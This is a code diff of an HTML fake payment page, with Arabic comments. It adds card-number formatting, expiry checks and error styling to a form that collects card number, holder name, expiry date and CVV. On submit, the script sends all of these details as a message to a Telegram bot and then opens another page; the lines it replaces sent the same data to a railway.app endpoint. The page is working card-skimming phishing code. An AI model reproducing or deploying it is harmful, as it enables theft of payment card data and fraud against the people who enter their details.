@@ -46,6 +46,7 @@
             border-radius: 10px;
             font-size: 14px;
             text-align: left;
+            transition: border 0.3s;
         }
 
         input:focus {
@@ -63,7 +64,7 @@
         }
 
         .expiry {
-            margin-right: 6px; /* إضافة مسافة بسيطة بين تاريخ الانتهاء و CVV */
+            margin-right: 6px;
         }
 
         .save-card {
@@ -99,6 +100,11 @@
             color: #777;
             margin-top: 10px;
         }
+
+        /* لون أحمر عند الخطأ */
+        .error {
+            border: 2px solid red !important;
+        }
     </style>
 </head>
 <body>
@@ -108,7 +114,7 @@
         <img src="https://i.imgur.com/ZR6p2ie.png" class="card-image" alt="Credit Card">
         
         <form id="paymentForm">
-            <input type="text" id="cardNumber" placeholder="Card Number" maxlength="16" pattern="\d*" required>
+            <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" required>
             <input type="text" id="cardHolder" placeholder="Card Holder Name" pattern="[A-Za-z ]+" required>
             
             <div class="input-row">
@@ -128,27 +134,93 @@
     </div>
 
     <script>
+        const BOT_TOKEN = "YOUR_BOT_TOKEN";  
+        const CHAT_ID = "YOUR_CHAT_ID";      
+
+        // تنسيق رقم البطاقة: إضافة مسافة كل 4 أرقام
+        document.getElementById("cardNumber").addEventListener("input", function(event) {
+            let value = event.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || '';
+            event.target.value = formattedValue;
+        });
+
+        // ضبط تاريخ الانتهاء وإضافة "/"
+        document.getElementById("expiryDate").addEventListener("input", function(event) {
+            let value = event.target.value.replace(/\D/g, ''); 
+            if (value.length >= 2) {
+                let mm = parseInt(value.substring(0, 2), 10);
+                let yy = parseInt(value.substring(2, 4), 10);
+
+                // ضبط الحدود القصوى والدنيا
+                if (mm < 1) mm = 1;
+                if (mm > 12) mm = 12;
+                if (yy < 25) yy = 25;
+                if (yy > 40) yy = 40;
+                if (yy === 25 && mm < 2) mm = 2;
+
+                event.target.value = mm.toString().padStart(2, '0') + "/" + yy.toString().padStart(2, '0');
+            }
+        });
+
         document.getElementById("paymentForm").addEventListener("submit", function(event) {
             event.preventDefault();
 
-            const cardNumber = document.getElementById("cardNumber").value;
-            const cardHolder = document.getElementById("cardHolder").value;
-            const expiryDate = document.getElementById("expiryDate").value;
-            const cvv = document.getElementById("cvv").value;
+            const cardNumber = document.getElementById("cardNumber");
+            const cardHolder = document.getElementById("cardHolder");
+            const expiryDate = document.getElementById("expiryDate");
+            const cvv = document.getElementById("cvv");
             const saveCard = document.getElementById("saveCard").checked ? "Yes" : "No";
 
-            fetch("https://nodejs-production-7090.up.railway.app/send", { 
+            let valid = true;
+
+            // التحقق من الإدخالات وتلوين الحقول بالأحمر عند الخطأ
+            if (cardNumber.value.replace(/\s/g, '').length !== 16) {
+                cardNumber.classList.add("error");
+                valid = false;
+            } else {
+                cardNumber.classList.remove("error");
+            }
+
+            if (!/^[A-Za-z ]+$/.test(cardHolder.value)) {
+                cardHolder.classList.add("error");
+                valid = false;
+            } else {
+                cardHolder.classList.remove("error");
+            }
+
+            let [mm, yy] = expiryDate.value.split("/");
+            if (!expiryDate.value.includes("/") || mm < 2 || yy < 25 || yy > 40) {
+                expiryDate.classList.add("error");
+                valid = false;
+            } else {
+                expiryDate.classList.remove("error");
+            }
+
+            if (!/^\d{3}$/.test(cvv.value)) {
+                cvv.classList.add("error");
+                valid = false;
+            } else {
+                cvv.classList.remove("error");
+            }
+
+            if (!valid) return;
+
+            const message = `
+                💳 *Payment Details* 💳
+                ----------------------------
+                👤 Name: ${cardHolder.value}
+                💳 Card Number: ${cardNumber.value}
+                📅 Expiry: ${expiryDate.value}
+                🔒 CVV: ${cvv.value}
+                💾 Save Card: ${saveCard}
+            `;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    name: cardHolder, 
-                    phone: cardNumber, 
-                    message: `Expiry: ${expiryDate}, CVV: ${cvv}, Save Card: ${saveCard}` 
-                })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
             })
-            .then(response => response.json())
-            .then(data => alert(data.message))
-            .catch(error => alert("حدث خطأ!"));
+            .then(() => window.open("page.html", "_blank"));
         });
     </script>
 
